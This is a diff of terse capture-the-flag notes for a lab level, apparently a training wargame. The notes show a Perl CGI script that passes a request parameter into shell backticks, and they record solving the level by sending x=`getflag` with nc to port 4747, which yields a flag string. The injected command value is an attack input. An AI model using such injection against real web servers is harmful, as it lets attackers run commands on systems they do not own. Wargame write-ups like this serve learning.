@@ -2,9 +2,9 @@
 - read code -> CGI -> Server ?
 	print `echo $y 2>&1`; <- $y corresponds to key x in param
 - search in /etc find apache2
-- cat /etc/apache2/sites-enabled -> :4747
+- cat /etc/apache2/sites-enabled/level05.conf -> :4747
 	SuexecUserGroup flag04 level04 <- setuid
 	DirectoryIndex level04.pl <- same script
-- create GET request with x=`getflag`
+- send GET request with x=`getflag`
 - nc 192.168.1.? 4747 < cgi_request
 	ne2searoevaevoem4ov4ar8ap
